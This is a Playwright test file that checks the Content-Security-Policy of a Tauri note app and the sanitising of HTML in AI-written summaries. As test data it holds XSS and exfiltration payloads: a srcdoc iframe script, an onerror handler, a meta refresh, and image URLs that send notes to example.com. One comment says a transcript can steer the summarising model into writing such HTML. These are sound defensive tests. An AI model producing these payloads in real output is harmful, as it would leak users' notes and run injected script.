import { test, expect, type Page } from "@playwright/test";
import { execFileSync } from "node:child_process";
import { readFileSync, rmSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { extname, join } from "node:path";
import { installTauriMock, makeNote } from "./support/tauri-mock";

// The production build under the Content-Security-Policy from
// tauri.conf.json, served the way Tauri serves it on Windows: the app from
// http://tauri.localhost with the policy as a header, files from
// http://asset.localhost. The dev server can't stand in for it, because it
// injects inline scripts the policy rightly refuses.

const APP = "http://tauri.localhost";
const ASSETS = "http://asset.localhost";
const dist = join(tmpdir(), `note67-csp-dist-${process.pid}`);

const conf = JSON.parse(readFileSync("src-tauri/tauri.conf.json", "utf8"));
const csp: Record<string, string> | null = conf.app.security.csp;
const header = Object.entries(csp ?? {})
  .map(([directive, sources]) => `${directive} ${sources}`)
  .join("; ");

const MIME: Record<string, string> = {
  ".html": "text/html",
  ".js": "text/javascript",
  ".css": "text/css",
  ".png": "image/png",
  ".svg": "image/svg+xml",
  ".woff2": "font/woff2",
  ".woff": "font/woff",
  ".ttf": "font/ttf",
};
const png = readFileSync("public/favicon.png");

/** 0.1 s of 8 kHz mono silence. */
function silentWav(): Buffer {
  const frames = 800;
  const wav = Buffer.alloc(44 + frames * 2);
  wav.write("RIFF", 0, "ascii");
  wav.writeUInt32LE(36 + frames * 2, 4);
  wav.write("WAVEfmt ", 8, "ascii");
  wav.writeUInt32LE(16, 16);
  wav.writeUInt16LE(1, 20); // PCM
  wav.writeUInt16LE(1, 22); // mono
  wav.writeUInt32LE(8000, 24);
  wav.writeUInt32LE(16000, 28);
  wav.writeUInt16LE(2, 32);
  wav.writeUInt16LE(16, 34);
  wav.write("data", 36, "ascii");
  wav.writeUInt32LE(frames * 2, 40);
  return wav;
}

const isFile = (path: string) => {
  try {
    return statSync(path).isFile();
  } catch {
    return false;
  }
};

/** Serves the build and the asset protocol, and records every violation. */
async function openApp(page: Page, commands: Record<string, unknown>) {
  await installTauriMock(page, commands);
  await page.addInitScript(
    ({ assets }) => {
      const w = window as unknown as {
        __cspViolations: string[];
        __TAURI_INTERNALS__: { convertFileSrc: (path: string) => string };
      };
      w.__cspViolations = [];
      document.addEventListener("securitypolicyviolation", (e) => {
        w.__cspViolations.push(`${e.violatedDirective} refused ${e.blockedURI}`);
      });
      // What Tauri's convertFileSrc returns on Windows.
      w.__TAURI_INTERNALS__.convertFileSrc = (path) =>
        `${assets}/${encodeURIComponent(path)}`;
    },
    { assets: ASSETS }
  );

  await page.route(`${APP}/**`, async (route) => {
    const { pathname } = new URL(route.request().url());
    const asset = join(dist, decodeURIComponent(pathname));
    const file = isFile(asset) ? asset : join(dist, "index.html");
    const headers: Record<string, string> = {
      "content-type": MIME[extname(file)] ?? "application/octet-stream",
    };
    if (file.endsWith(".html")) headers["content-security-policy"] = header;
    await route.fulfill({ body: readFileSync(file), headers });
  });
  await page.route(`${ASSETS}/**`, (route) => {
    const audio = route.request().url().endsWith(".wav");
    return route.fulfill({
      body: audio ? silentWav() : png,
      headers: { "content-type": audio ? "audio/wav" : "image/png" },
    });
  });
  // Anything remote would be answered, so only the policy can stop it.
  await page.route("https://example.com/**", (route) =>
    route.fulfill({ body: png, headers: { "content-type": "image/png" } })
  );

  await page.goto(`${APP}/`);
}

/** Requests that left for the remote test host. */
function watchOutbound(page: Page): string[] {
  const outbound: string[] = [];
  page.on("request", (request) => {
    if (request.url().startsWith("https://example.com")) outbound.push(request.url());
  });
  return outbound;
}

const violations = (page: Page) =>
  page.evaluate(() => (window as unknown as { __cspViolations: string[] }).__cspViolations);

const noteTab = (page: Page, name: string) =>
  page
    .locator("div.flex.gap-6", {
      has: page.getByRole("button", { name: /^transcript/i }),
    })
    .getByRole("button", { name: new RegExp(`^${name}`, "i") });

// One build per worker, shared by every test in this file.
test.beforeAll(async ({}, testInfo) => {
  testInfo.setTimeout(180_000);
  execFileSync("npx", ["vite", "build", "--outDir", dist, "--emptyOutDir", "--logLevel", "error"]);
});
test.afterAll(() => rmSync(dist, { recursive: true, force: true }));

test.describe("Content-Security-Policy", () => {

  test("keeps scripts to the app's own files", () => {
    expect(csp, "tauri.conf.json has a CSP").not.toBeNull();
    const scripts = (csp!["script-src"] ?? csp!["default-src"]).split(/\s+/);
    expect(scripts).toEqual(["'self'"]);
    expect(csp!["object-src"]).toBe("'none'");
  });

  test("lets the whole app run", async ({ page }) => {
    const attachments = "/Users/me/Library/Application Support/com.note67.app/attachments/n1";
    const note = makeNote({
      id: "n1",
      title: "Pricing review",
      audio_path: "/Users/me/Library/Application Support/com.note67.app/recordings/n1_playback.wav",
      description: [
        "Notes with **bold** and a [link](https://example.com/docs).",
        "",
        "```js",
        "const tiers = ['free', 'pro'];",
        "```",
        "",
        "$$",
        "\\bigg( \\sum_{i=1}^{n} \\frac{a_i}{b_i} \\bigg)",
        "$$",
        "",
        "| Tier | Price |",
        "| --- | --- |",
        "| Pro | $12 |",
        "",
        `![pasted](${ASSETS}/${encodeURIComponent(`${attachments}/chart.png`)})`,
      ].join("\n"),
    });
    await openApp(page, {
      list_notes: [note],
      get_note: note,
      search_notes: [note],
      get_note_summaries: [
        {
          id: 1,
          note_id: note.id,
          summary_type: "overview",
          content: "## Summary\n\n| Owner | Task |\n| --- | --- |\n| Sofia | Pricing deck<br>by Friday |",
          created_at: "2026-07-02T09:31:00.000Z",
        },
      ],
      get_transcript: [
        {
          id: 1,
          note_id: note.id,
          start_time: 0,
          end_time: 3,
          text: "Let's ship the new pricing on Friday.",
          speaker: "You",
          source_type: "segment",
          source_id: 1,
          created_at: "2026-07-02T09:00:00.000Z",
        },
      ],
      get_action_items: [
        {
          id: 1,
          note_id: note.id,
          stable_id: "a1",
          text: "Send the pricing deck",
          due_date: "2026-07-11",
          done: false,
          sort_order: 0,
          created_at: "2026-07-02T09:31:00.000Z",
          updated_at: "2026-07-02T09:31:00.000Z",
        },
      ],
      export_note_markdown: { markdown: "# Pricing review\n\n- Ship Friday", filename: "Pricing review.md" },
      "plugin:dialog|save": "/Users/me/Documents/Pricing review.pdf",
      "plugin:fs|write_file": null,
    });

    await page.getByRole("button", { name: /pricing review/i }).first().click();

    // Summary: markdown with raw HTML, as the model writes it.
    await expect(page.getByText(/Pricing deck/)).toBeVisible();

    // The editor, with every kind of block it renders.
    await noteTab(page, "note").click();
    await expect(page.locator("main .ProseMirror")).toHaveCount(1);
    // CodeMirror, for the code block and the math block's source.
    await expect(page.locator("main .cm-editor").first()).toBeVisible();
    await expect(page.locator("main .katex").first()).toBeVisible();
    await expect(page.locator("main").getByText("$12", { exact: true })).toBeVisible();
    const pasted = page.locator(`main img[src^="${ASSETS}"]`).first();
    await expect(pasted).toBeVisible();
    await expect.poll(() => pasted.evaluate((img: HTMLImageElement) => img.naturalWidth)).toBeGreaterThan(0);

    // Transcript, and the recording through the asset protocol.
    await noteTab(page, "transcript").click();
    await expect(page.getByText("Let's ship the new pricing on Friday.")).toBeVisible();
    await expect
      .poll(() => page.locator("audio").first().evaluate((a: HTMLAudioElement) => a.readyState))
      .toBeGreaterThan(0);

    await noteTab(page, "tasks").click();
    await expect(page.getByText("Send the pricing deck")).toBeVisible();

    // PDF export: pdfmake builds the file in the page, then it's saved.
    await page.getByTitle("More actions").click();
    await page.getByRole("button", { name: "Export Note" }).click();
    await page.waitForFunction(() =>
      ((window as unknown as { __tauriPluginCalls?: string[] }).__tauriPluginCalls ?? []).includes(
        "plugin:fs|write_file"
      )
    );

    // Search, the Tasks page and Settings.
    await page.keyboard.press("Control+k");
    await page.getByPlaceholder("Search notes...").fill("pricing");
    await expect(page.getByRole("button", { name: /pricing review.*2026/i })).toBeVisible();
    await page.keyboard.press("Escape");
    await page.getByRole("button", { name: "Tasks", exact: true }).click();
    await expect(page.getByRole("heading", { name: "Tasks" })).toBeVisible();
    await page.keyboard.press("Control+,");
    for (const tab of ["Appearance", "System", "Whisper", "Ollama", "About", "Updates"]) {
      await page.getByRole("button", { name: tab, exact: true }).click();
    }

    expect(await violations(page)).toEqual([]);
  });

  test("stops script and requests out of HTML that gets into the page", async ({ page }) => {
    // The policy on its own, whatever way HTML got in: a srcdoc frame is
    // same-origin and runs its own scripts, with the page's access to every
    // command, and a remote image can carry the notes in its URL.
    const note = makeNote({ id: "n1", title: "Vendor call" });
    await openApp(page, { list_notes: [note], get_note: note });
    const outbound = watchOutbound(page);
    await page.getByRole("button", { name: /vendor call/i }).first().click();

    await page.evaluate(() => {
      const frame = document.createElement("iframe");
      frame.srcdoc = "<script>parent.__pwned = 'srcdoc'</script>";
      const image = document.createElement("img");
      image.src = "https://example.com/chart.png?notes=pricing+is+%2412";
      document.body.append(frame, image);
    });
    await page.waitForFunction(() => {
      const frame = document.querySelector("body > iframe") as HTMLIFrameElement | null;
      return frame?.contentDocument?.readyState === "complete";
    });
    await page.waitForTimeout(300);

    expect(await page.evaluate(() => (window as unknown as { __pwned?: string }).__pwned)).toBeUndefined();
    expect(await violations(page)).toContain(
      "img-src refused https://example.com/chart.png?notes=pricing+is+%2412"
    );
    expect(outbound).toEqual([]);
  });
});

test.describe("AI summary HTML", () => {

  test("renders without the parts that could act on their own", async ({ page }) => {
    // A transcript can steer the model, and summaries render the HTML it
    // writes. What could act is removed before it renders (rehype-sanitize);
    // a remote image is left to the policy, and a <meta refresh> would have
    // sent the window, notes in the URL, to another site.
    const note = makeNote({ id: "n1", title: "Vendor call" });
    await openApp(page, {
      list_notes: [note],
      get_note: note,
      get_note_summaries: [
        {
          id: 1,
          note_id: note.id,
          summary_type: "overview",
          content: [
            "## Summary",
            "",
            `<meta http-equiv="refresh" content="0;url=https://example.com/leak?notes=secret">`,
            `<iframe srcdoc="<script>parent.__pwned = 'srcdoc'</script>"></iframe>`,
            `<img src="missing.png" onerror="window.__pwned = 'onerror'">`,
            "<style>main { display: none }</style>",
            "",
            "| Owner | Task |",
            "| --- | --- |",
            "| Sofia | Pricing deck<br>by Friday |",
            "",
            "![chart](https://example.com/chart.png?notes=pricing+is+%2412)",
          ].join("\n"),
          created_at: "2026-07-02T09:31:00.000Z",
        },
      ],
    });
    const outbound = watchOutbound(page);
    await page.getByRole("button", { name: /vendor call/i }).first().click();

    await expect(page.getByText("by Friday")).toBeVisible();
    await page.waitForTimeout(1500);
    await expect(page.locator("main td br")).toHaveCount(1);
    for (const tag of ["iframe", "meta", "style"]) {
      await expect(page.locator(`main ${tag}`), tag).toHaveCount(0);
    }
    expect(page.url()).toBe(`${APP}/`);
    expect(await page.evaluate(() => (window as unknown as { __pwned?: string }).__pwned)).toBeUndefined();
    expect(await violations(page)).toContain(
      "img-src refused https://example.com/chart.png?notes=pricing+is+%2412"
    );
    expect(outbound).toEqual([]);
  });
});
